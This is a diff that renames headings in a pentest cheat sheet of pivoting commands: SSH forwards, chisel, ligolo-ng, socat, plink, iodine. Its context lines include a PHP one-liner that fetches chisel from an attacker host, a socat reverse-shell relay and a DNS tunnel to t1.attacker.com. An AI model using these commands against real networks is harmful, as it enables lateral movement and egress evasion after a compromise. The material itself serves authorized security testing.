@@ -6,7 +6,7 @@
 
 ---
 
-## Pivot - SSH Local Forward (-L)
+## forward ssh local port
 Forward attacker:local_port -> remote target through SSH.
 
 ```bash
@@ -17,7 +17,7 @@ ssh -L {{LOCAL_PORT:port:8080}}:127.0.0.1:{{REMOTE_PORT:port:8080}} {{USERNAME:s
 
 ---
 
-## Pivot - SSH Local Forward to Internal Host
+## forward ssh local internal host
 Reach a host behind the SSH server.
 
 ```bash
@@ -28,7 +28,7 @@ ssh -L {{LOCAL_PORT:port:5432}}:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:
 
 ---
 
-## Pivot - SSH Remote Forward (-R)
+## forward ssh remote port
 Open a listener on victim that forwards to attacker.
 
 ```bash
@@ -39,7 +39,7 @@ ssh -R {{REMOTE_PORT:port:8080}}:127.0.0.1:{{ATTACKER_PORT:port:8080}} {{USERNAM
 
 ---
 
-## Pivot - SSH Dynamic SOCKS Proxy (-D)
+## tunnel ssh dynamic socks proxy
 SOCKS5 proxy through SSH.
 
 ```bash
@@ -50,7 +50,7 @@ ssh -D {{SOCKS_PORT:port:1080}} -N {{USERNAME:str:user}}@{{TARGET:ip}}
 
 ---
 
-## Pivot - SSH Multi-Hop ProxyJump
+## chain ssh proxyjump multi-hop
 Chain SSH hops in one command.
 
 ```bash
@@ -61,7 +61,7 @@ ssh -J {{HOP1:str:user@10.10.10.1}} {{USERNAME:str:user}}@{{INTERNAL_HOST:ip:10.
 
 ---
 
-## Pivot - sshuttle (VPN over SSH)
+## tunnel sshuttle subnet vpn
 Route subnet through SSH like a VPN.
 
 ```bash
@@ -72,7 +72,7 @@ sshuttle -r {{USERNAME:str:user}}@{{TARGET:ip}} {{INTERNAL_NET:str:10.10.20.0/24
 
 ---
 
-## Pivot - chisel Server (Attacker)
+## start chisel server reverse
 Listen for chisel client.
 
 ```bash
@@ -83,7 +83,7 @@ Listen for chisel client.
 
 ---
 
-## Pivot - chisel Client Reverse SOCKS (Victim)
+## tunnel chisel reverse socks
 Open SOCKS5 reverse proxy on attacker.
 
 ```bash
@@ -94,7 +94,7 @@ Open SOCKS5 reverse proxy on attacker.
 
 ---
 
-## Pivot - chisel Client Reverse Port Forward
+## forward chisel reverse port
 Expose victim's localhost:3306 to attacker:3307.
 
 ```bash
@@ -105,7 +105,7 @@ Expose victim's localhost:3306 to attacker:3307.
 
 ---
 
-## Pivot - chisel Client to Internal Host
+## forward chisel internal host
 Forward attacker:5000 to internal_host:5000 via victim.
 
 ```bash
@@ -116,7 +116,7 @@ Forward attacker:5000 to internal_host:5000 via victim.
 
 ---
 
-## Pivot - Drop chisel via PHP one-liner
+## drop chisel php oneliner
 Useful when only RCE/limited shell.
 
 ```bash
@@ -127,7 +127,7 @@ php -r 'file_put_contents("chisel", file_get_contents("http://{{LHOST:ip}}:{{LPO
 
 ---
 
-## Pivot - ligolo-ng Setup (Attacker, One-Time)
+## setup ligolo tun interface
 Create the ligolo TUN interface.
 
 ```bash
@@ -139,7 +139,7 @@ sudo ip link set ligolo up
 
 ---
 
-## Pivot - ligolo-ng Proxy (Attacker)
+## start ligolo proxy
 Run the proxy with self-signed cert.
 
 ```bash
@@ -150,7 +150,7 @@ Run the proxy with self-signed cert.
 
 ---
 
-## Pivot - ligolo-ng Agent (Victim)
+## connect ligolo agent
 Connect agent back to attacker.
 
 ```bash
@@ -161,7 +161,7 @@ Connect agent back to attacker.
 
 ---
 
-## Pivot - ligolo-ng Add Route
+## add ligolo route subnet
 Route subnet through tunnel (run inside ligolo proxy session).
 
 ```bash
@@ -172,7 +172,7 @@ sudo ip route add {{INTERNAL_NET:str:10.10.20.0/24}} dev ligolo
 
 ---
 
-## Pivot - ligolo-ng Listener (Reverse)
+## add ligolo reverse listener
 Expose attacker port via agent (e.g. for relay back).
 
 ```bash
@@ -183,7 +183,7 @@ echo "ligolo-ng » listener_add --addr 0.0.0.0:{{LISTEN_PORT:port:8888}} --to 12
 
 ---
 
-## Pivot - proxychains Setup
+## setup proxychains socks
 Configure proxychains to route through SOCKS.
 
 ```bash
@@ -195,7 +195,7 @@ proxychains4 -q nmap -sT -Pn {{INTERNAL_HOST:ip:10.10.20.5}}
 
 ---
 
-## Pivot - proxychains nxc/curl
+## run proxychains nxc curl
 Run common tools through SOCKS.
 
 ```bash
@@ -207,7 +207,7 @@ proxychains4 -q curl -s {{URL:url:http://10.10.20.5}}
 
 ---
 
-## Pivot - socat TCP Forward
+## forward socat tcp relay
 Quick TCP relay.
 
 ```bash
@@ -218,7 +218,7 @@ socat TCP-LISTEN:{{LOCAL_PORT:port:8080}},fork,reuseaddr TCP:{{INTERNAL_HOST:ip:
 
 ---
 
-## Pivot - socat Reverse Shell Relay
+## relay socat reverse shell
 Relay reverse shell through pivot host.
 
 ```bash
@@ -229,7 +229,7 @@ socat TCP-LISTEN:{{LOCAL_PORT:port:9001}},fork,reuseaddr TCP:{{LHOST:ip}}:{{LPOR
 
 ---
 
-## Pivot - netsh portproxy (Windows)
+## forward netsh portproxy windows
 Built-in Windows port forward.
 
 ```bash
@@ -242,7 +242,7 @@ netsh interface portproxy delete v4tov4 listenport={{LOCAL_PORT:port:8080}}
 
 ---
 
-## Pivot - plink Reverse Shell (Windows)
+## tunnel plink reverse ssh windows
 Pure plink.exe reverse SSH for legacy Windows.
 
 ```bash
@@ -253,7 +253,7 @@ plink.exe -ssh -l {{USERNAME:str:user}} -pw {{PASSWORD:str:pass}} -R {{REMOTE_PO
 
 ---
 
-## Pivot - DNS Tunnel (iodine)
+## tunnel iodine dns
 Last-resort tunnel via DNS.
 
 ```bash
@@ -265,7 +265,7 @@ sudo iodine -P {{PASSWORD:str:secret}} {{TUNNEL_DOMAIN:domain:t1.attacker.com}}
 
 ---
 
-## Pivot - ICMP Tunnel (ptunnel)
+## tunnel ptunnel icmp
 ICMP tunnel for restrictive egress.
 
 ```bash
@@ -276,7 +276,7 @@ sudo ptunnel-ng -p {{LHOST:ip}}
 
 ---
 
-## Pivot - Inspect Routing on Compromised Host
+## inspect host routing pivot
 Check what subnets the host can reach.
 
 ```bash
@@ -290,7 +290,7 @@ cat /etc/resolv.conf
 
 ---
 
-## Pivot - Find Internal Listening Ports
+## list internal listening ports
 What's listening locally that we can forward.
 
 ```bash
@@ -301,7 +301,7 @@ ss -tlnp 2>/dev/null || netstat -tlnp
 
 ---
 
-## Pivot - Add Route via Ligolo (240.0.0.1 trick)
+## add ligolo route dc 240.0.0.1
 Route 240.0.0.1/32 to access "DC itself" via tunnel.
 
 ```bash
